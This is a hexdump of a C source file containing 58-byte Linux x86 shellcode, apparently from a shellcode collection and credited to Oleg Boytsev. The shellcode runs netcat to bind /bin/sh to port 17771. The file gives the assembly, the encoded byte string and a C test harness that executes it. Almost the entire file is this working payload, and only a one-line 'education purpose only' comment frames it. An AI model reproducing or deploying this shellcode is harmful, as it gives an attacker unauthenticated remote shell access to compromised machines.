00000000  2f 2a 0a 23 20 4c 69 6e  75 78 20 78 38 36 20 2f  |/*.# Linux x86 /|
00000010  62 69 6e 2f 6e 63 20 2d  6c 65 20 2f 62 69 6e 2f  |bin/nc -le /bin/|
00000020  73 68 20 2d 76 70 20 31  37 37 37 31 20 73 68 65  |sh -vp 17771 she|
00000030  6c 6c 63 6f 64 65 0a 23  20 54 68 69 73 20 73 68  |llcode.# This sh|
00000040  65 6c 6c 63 6f 64 65 20  77 69 6c 6c 20 6c 69 73  |ellcode will lis|
00000050  74 65 6e 20 6f 6e 20 70  6f 72 74 20 31 37 37 37  |ten on port 1777|
00000060  31 20 61 6e 64 20 67 69  76 65 20 79 6f 75 20 2f  |1 and give you /|
00000070  62 69 6e 2f 73 68 0a 23  20 44 61 74 65 3a 20 33  |bin/sh.# Date: 3|
00000080  31 2e 30 35 2e 32 30 31  34 0a 23 20 53 68 65 6c  |1.05.2014.# Shel|
00000090  6c 63 6f 64 65 20 41 75  74 68 6f 72 3a 20 4f 6c  |lcode Author: Ol|
000000a0  65 67 20 42 6f 79 74 73  65 76 0a 23 20 54 65 73  |eg Boytsev.# Tes|
000000b0  74 65 64 20 6f 6e 3a 20  44 65 62 69 61 6e 20 47  |ted on: Debian G|
000000c0  4e 55 2f 4c 69 6e 75 78  20 37 2f 69 36 38 36 0a  |NU/Linux 7/i686.|
000000d0  23 20 53 68 65 6c 6c 63  6f 64 65 20 4c 65 6e 67  |# Shellcode Leng|
000000e0  74 68 3a 20 35 38 0a 23  20 46 6f 72 20 65 64 75  |th: 58.# For edu|
000000f0  63 61 74 69 6f 6e 20 70  75 72 70 6f 73 65 20 6f  |cation purpose o|
00000100  6e 6c 79 0a 0a 67 6c 6f  62 61 6c 20 5f 73 74 61  |nly..global _sta|
00000110  72 74 0a 73 65 63 74 69  6f 6e 20 2e 74 65 78 74  |rt.section .text|
00000120  0a 20 5f 73 74 61 72 74  3a 0a 20 20 20 20 78 6f  |. _start:.    xo|
00000130  72 20 65 61 78 2c 20 65  61 78 0a 20 20 20 20 78  |r eax, eax.    x|
00000140  6f 72 20 65 64 78 2c 20  65 64 78 0a 20 20 20 20  |or edx, edx.    |
00000150  70 75 73 68 20 65 61 78  0a 20 20 20 20 70 75 73  |push eax.    pus|
00000160  68 20 30 78 33 31 33 37  33 37 33 37 20 20 20 20  |h 0x31373737    |
00000170  20 3b 2d 76 70 31 37 37  37 31 0a 20 20 20 20 70  | ;-vp17771.    p|
00000180  75 73 68 20 30 78 33 31  37 30 37 36 32 64 0a 20  |ush 0x3170762d. |
00000190  20 20 20 6d 6f 76 20 65  73 69 2c 20 65 73 70 0a  |   mov esi, esp.|
000001a0  0a 20 20 20 20 70 75 73  68 20 65 61 78 0a 20 20  |.    push eax.  |
000001b0  20 20 70 75 73 68 20 30  78 36 38 37 33 32 66 32  |  push 0x68732f2|
000001c0  66 20 20 20 20 20 3b 2d  6c 65 2f 2f 62 69 6e 2f  |f     ;-le//bin/|
000001d0  2f 73 68 0a 20 20 20 20  70 75 73 68 20 30 78 36  |/sh.    push 0x6|
000001e0  65 36 39 36 32 32 66 0a  20 20 20 20 70 75 73 68  |e69622f.    push|
000001f0  20 30 78 32 66 36 35 36  63 32 64 0a 20 20 20 20  | 0x2f656c2d.    |
00000200  6d 6f 76 20 65 64 69 2c  20 65 73 70 0a 0a 20 20  |mov edi, esp..  |
00000210  20 20 70 75 73 68 20 65  61 78 0a 20 20 20 20 70  |  push eax.    p|
00000220  75 73 68 20 30 78 36 33  36 65 32 66 32 66 20 20  |ush 0x636e2f2f  |
00000230  20 20 20 3b 2f 62 69 6e  2f 2f 6e 63 0a 20 20 20  |   ;/bin//nc.   |
00000240  20 70 75 73 68 20 30 78  36 65 36 39 36 32 32 66  | push 0x6e69622f|
00000250  0a 20 20 20 20 6d 6f 76  20 65 62 78 2c 20 65 73  |.    mov ebx, es|
00000260  70 0a 0a 20 20 20 20 70  75 73 68 20 65 64 78 0a  |p..    push edx.|
00000270  20 20 20 20 70 75 73 68  20 65 73 69 0a 20 20 20  |    push esi.   |
00000280  20 70 75 73 68 20 65 64  69 0a 20 20 20 20 70 75  | push edi.    pu|
00000290  73 68 20 65 62 78 0a 20  20 20 20 6d 6f 76 20 65  |sh ebx.    mov e|
000002a0  63 78 2c 20 65 73 70 0a  20 20 20 20 6d 6f 76 20  |cx, esp.    mov |
000002b0  61 6c 2c 31 31 0a 20 20  20 20 69 6e 74 20 30 78  |al,11.    int 0x|
000002c0  38 30 0a 2a 2f 0a 0a 23  69 6e 63 6c 75 64 65 20  |80.*/..#include |
000002d0  3c 73 74 64 69 6f 2e 68  3e 0a 23 69 6e 63 6c 75  |<stdio.h>.#inclu|
000002e0  64 65 20 3c 73 74 72 69  6e 67 2e 68 3e 0a 0a 75  |de <string.h>..u|
000002f0  6e 73 69 67 6e 65 64 20  63 68 61 72 20 73 68 65  |nsigned char she|
00000300  6c 6c 63 6f 64 65 5b 5d  20 3d 0a 22 5c 78 33 31  |llcode[] =."\x31|
00000310  5c 78 63 30 5c 78 33 31  5c 78 64 32 5c 78 35 30  |\xc0\x31\xd2\x50|
00000320  5c 78 36 38 5c 78 33 37  5c 78 33 37 5c 78 33 37  |\x68\x37\x37\x37|
00000330  5c 78 33 31 5c 78 36 38  5c 78 32 64 5c 78 37 36  |\x31\x68\x2d\x76|
00000340  5c 78 37 30 5c 78 33 31  5c 78 38 39 5c 78 65 36  |\x70\x31\x89\xe6|
00000350  5c 78 35 30 5c 78 36 38  5c 78 32 66 5c 78 32 66  |\x50\x68\x2f\x2f|
00000360  5c 78 37 33 5c 78 36 38  5c 78 36 38 5c 78 32 66  |\x73\x68\x68\x2f|
00000370  5c 78 36 32 5c 78 36 39  5c 78 36 65 5c 78 36 38  |\x62\x69\x6e\x68|
00000380  5c 78 32 64 5c 78 36 63  5c 78 36 35 5c 78 32 66  |\x2d\x6c\x65\x2f|
00000390  5c 78 38 39 5c 78 65 37  5c 78 35 30 5c 78 36 38  |\x89\xe7\x50\x68|
000003a0  5c 78 32 66 5c 78 32 66  5c 78 36 65 5c 78 36 33  |\x2f\x2f\x6e\x63|
000003b0  5c 78 36 38 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\x68\x2f\x62\x69|
000003c0  5c 78 36 65 5c 78 38 39  5c 78 65 33 5c 78 35 32  |\x6e\x89\xe3\x52|
000003d0  5c 78 35 36 5c 78 35 37  5c 78 35 33 5c 78 38 39  |\x56\x57\x53\x89|
000003e0  5c 78 65 31 5c 78 62 30  5c 78 30 62 5c 78 63 64  |\xe1\xb0\x0b\xcd|
000003f0  5c 78 38 30 22 3b 0a 0a  0a 6d 61 69 6e 28 29 0a  |\x80";...main().|
00000400  7b 0a 20 20 20 20 20 20  20 20 70 72 69 6e 74 66  |{.        printf|
00000410  28 22 53 68 65 6c 6c 63  6f 64 65 20 4c 65 6e 67  |("Shellcode Leng|
00000420  74 68 3a 20 25 64 5c 6e  22 2c 73 74 72 6c 65 6e  |th: %d\n",strlen|
00000430  28 73 68 65 6c 6c 63 6f  64 65 29 29 3b 0a 20 20  |(shellcode));.  |
00000440  20 20 20 20 20 20 69 6e  74 20 28 2a 72 65 74 29  |      int (*ret)|
00000450  28 29 20 3d 20 28 69 6e  74 28 2a 29 28 29 29 73  |() = (int(*)())s|
00000460  68 65 6c 6c 63 6f 64 65  3b 0a 20 20 20 20 20 20  |hellcode;.      |
00000470  20 20 72 65 74 28 29 3b  0a 7d                    |  ret();.}|
0000047a
